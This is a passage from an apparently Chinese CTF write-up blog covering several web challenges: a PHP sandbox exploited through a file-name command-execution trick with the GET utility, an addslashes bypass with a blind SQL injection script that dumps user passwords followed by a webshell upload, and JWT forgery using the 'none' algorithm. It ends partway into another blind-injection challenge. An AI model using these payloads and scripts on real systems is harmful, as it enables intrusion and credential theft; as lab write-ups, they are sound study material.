class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line"><span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//157.0.207.216 </span></span><br></pre></td></tr></table></figure><p><strong>这道题的考点是 GET 这个命令的一个命令执行漏洞</strong></p><p><strong>要执行的命令先前必须要有以命令为文件名的文件存在</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="string">&#x27;ls|&#x27;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(GET <span class="string">&quot;file:ls|&quot;</span>)</span><br></pre></td></tr></table></figure><p>就是如果存在一个以<strong>命令命名</strong>的文件存在  使用<code>GET file:文件名</code>的话就可以运行这个命令</p><p><img src="../images/image-20230708200522891.png" alt="image-20230708200522891"></p><ul><li>第一步</li></ul><p>先创建一个以<strong>命令</strong>命名的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:ls /|&amp;filename=ls /|</span><br></pre></td></tr></table></figure><ul><li>第二步</li></ul><p>然后令  <strong>url</strong>  为   <strong>file:文件名</strong>     ，然后就是将运行结果存入data里   然后再存入第一步创建的文件中 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:ls /|&amp;filename=ls /|</span><br></pre></td></tr></table></figure><ul><li>第三步</li></ul><p><img src="../images/image-20230708200801807.png" alt="image-20230708200801807"></p><p>访问这个路径下的在第一步创建的文件</p><p>然后就可以拿到flag了</p><p><img src="../images/image-20230708200917054.png" alt="image-20230708200917054"></p><p>然后在重复以上步骤来创建这个<code>/readflag</code>  </p><p><strong>第一步</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</span><br></pre></td></tr></table></figure><p><strong>第二步 读文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sandbox/13f6609a7c632f9b54e7fa69869971c2/bash -c /readflag|</span><br></pre></td></tr></table></figure><p>这里不直接创建<code>/readflag|</code>的原因是因为这个前面有个斜杠  会直接创建在根目录  这会和原本的重合  所以是不行的</p><p><strong>这样是可以的  |/readflag</strong></p><p><img src="../images/image-20230708201552480.png" alt="image-20230708201552480"></p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>题目</p><p>疯狂套娃  没啥可看的  直接跳过</p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>题目</p><p><img src="../images/image-20230708203153006.png" alt="image-20230708203153006"></p><p>题目就一个登录框  (感觉像是sql注入)</p><p>信息收集一下 </p><p><img src="../images/image-20230708204530754.png" alt="image-20230708204530754"></p><p><img src="../images/image-20230708204542938.png" alt="image-20230708204542938"></p><p>第一个是存在备份文件   第二个是存在sql注入点</p><p><img src="../images/image-20230708204642851.png" alt="image-20230708204642851"></p><p><strong>访问<code>image.php.bak</code>成功下载备份文件</strong></p><p><strong>内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>这里用到的一个转义函数  <code>addslashes</code></p><p><img src="../images/image-20230708205143296.png" alt="image-20230708205143296"></p><p>就是会将  ‘  “  \  用 \ 给转义了</p><p><strong>根据经验来说 这里的漏洞出现的地方一般是在这个waf这里</strong></p><p><img src="../images/image-20230708211114040.png" alt="image-20230708211114040"></p><p>思路就是将这个单引号给破坏掉  这里的话这个waf刚好就能办到  </p><p>举个例子 </p><p>如果我们传进来 <code>\\\\0</code>的话    这里会因为有这个<code>addslashes</code>函数的关系  会在多一个反斜杠，就会变成 <code>\\\\\0</code>   然后因为waf的存在   会将<code>\0</code>给替换成空   那么id就会变成<code>\\\\</code>  那么就会把后半个引号给转义掉  那么<code>path</code>的话我们可以使用注释#符号来给后半个引号给注释掉  那么我们就可以成功让这个<strong>sql语句成</strong>功回显了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id=&#x27;\\\\&#x27; or path=&#x27;or 1#&#x27;</span><br></pre></td></tr></table></figure><p>那么这个部分就是一个整体了</p><p><img src="../images/image-20230708211745476.png" alt="image-20230708211745476"></p><p>然后因为后面的<code>or 1</code>,所以就可以成功查出所有结果</p><p><strong>因为这里是无回显的所以我们得写一个盲注脚本来判断   如果失败的是会返回404,</strong></p><p><strong>就是利用这一点来获取正确结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">r&#x27;http://a563b70a-acef-493b-aacd-34608c733374.node3.buuoj.cn/image.php?id=\\0&amp;path=or &#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tablelen</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        payload=<span class="string">&#x27;(select(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)%23&#x27;</span></span><br><span class="line">        result=requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>!= result.text <span class="keyword">and</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;tablenlen：&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tablename</span>(<span class="params">tablelen</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,tablelen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">127</span>):</span><br><span class="line">            payload=<span class="string">&#x27;(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))=&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)%23&#x27;</span></span><br><span class="line">            result=requests.get(url=url+payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>!= result.text <span class="keyword">and</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columnlen</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        payload=<span class="string">&#x27;(length((select(group_concat(column_name))from(information_schema.columns)where(table_name)=0x7573657273))=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)%23&#x27;</span></span><br><span class="line">        result=requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>!= result.text <span class="keyword">and</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;columnlen：&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columnname</span>(<span class="params">columnlen</span>):</span><br><span class="line">    columnname=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,columnlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">127</span>):</span><br><span class="line">            payload=<span class="string">&#x27;(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=0x7573657273),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))=&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)%23&#x27;</span></span><br><span class="line">            result=requests.get(url=url+payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>!= result.text <span class="keyword">and</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                columnname+=<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> columnname</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">columnname</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">127</span>):</span><br><span class="line">            payload=<span class="string">&#x27;(ascii(substr((select group_concat(password) from users),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))=&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)--+&#x27;</span></span><br><span class="line">            result=requests.get(url=url+payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>!= result.text <span class="keyword">and</span> <span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                <span class="built_in">print</span> (<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span>    </span><br><span class="line">tablelen=tablelen()</span><br><span class="line">tablename=tablename(tablelen)</span><br><span class="line">columnlen=columnlen()</span><br><span class="line">columnname=columnname(columnlen)</span><br><span class="line">datalen=dump()</span><br></pre></td></tr></table></figure><p>然后爆出的用户名和密码分别是</p><p><strong>admin,91f63d79e4b19e55c5c9</strong></p><p><strong>进行登录</strong></p><p><img src="../images/image-20230708214406151.png" alt="image-20230708214406151"></p><p><strong>然后尝试上传文件</strong></p><p><img src="../images/image-20230708214754952.png" alt="image-20230708214754952"></p><p>测试了一下  发现这里会把上传的文件名给上传到这个php文件下</p><p>那么我们就可以传个一句话木马的文件名就行了</p><p><img src="../images/image-20230708215613009.png" alt="image-20230708215613009"></p><p>然后就可以rce了</p><p><img src="../images/image-20230708215628876.png" alt="image-20230708215628876"></p><p><img src="../images/image-20230708215702404.png" alt="image-20230708215702404"></p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>题目</p><p><img src="../images/image-20230709213417022.png" alt="image-20230709213417022"></p><p>就只有一个登录框</p><p><img src="../images/image-20230709213835533.png" alt="image-20230709213835533"></p><p>查看源码发现一个<strong>app.js</strong>    </p><p><img src="../images/image-20230709215342802.png" alt="image-20230709215342802"></p><p>里面提示了一个koa  于是就去搜索这是个什么东西</p><p><img src="../images/image-20230709215705099.png" alt="image-20230709215705099"></p><p>搜到一个结构图</p><p>根据这个图，去读取<strong>/controllers/api.js</strong>文件（至于为啥是api.js而不是app.js我还没想通）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">APIError</span> = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).<span class="property">APIError</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">18</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.<span class="property">header</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">body</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">query</span>.<span class="property">authorization</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.<span class="property">session</span>.<span class="property">username</span> !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.<span class="property">session</span>.<span class="property">username</span> = <span class="literal">null</span>;</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>得到源码</p><p>大概审计了一下代码发现</p><p><img src="../images/image-20230709220015166.png" alt="image-20230709220015166"></p><p>只要满足这个条件的话就能获取到flag</p><p><img src="../images/image-20230709220205581.png" alt="image-20230709220205581"></p><p>这里的话是在这个路由下使用jwt来生成session  并且这个密钥还是随机值</p><p><img src="../images/image-20230709220419050.png" alt="image-20230709220419050"></p><p>生成了token</p><p><img src="../images/image-20230709221625474.png" alt="image-20230709221625474"></p><p>由于我们不知道密钥  试了一下使用<code>jwt-crack</code>  爆破不出来  所以这里就采用另一种方法  就是将加密方式设为空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;222&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1688911442</span></span><br><span class="line">&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>然后替换就行了</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p><img src="../images/image-20230709224039609.png" alt="image-20230709224039609"></p><p>根据题目和这个返回的信息来看  感觉像是个bool盲注</p><p><img src="../images/image-20230710153249695.png" alt="image-20230710153249695"></p><p><img src="../images/image-20230710153301584.png" alt="image-20230710153301584"></p><p><img src="../images/image-20230710153314162.png" alt="image-20230710153314162"></p><p>输入123分别对应这几个结果   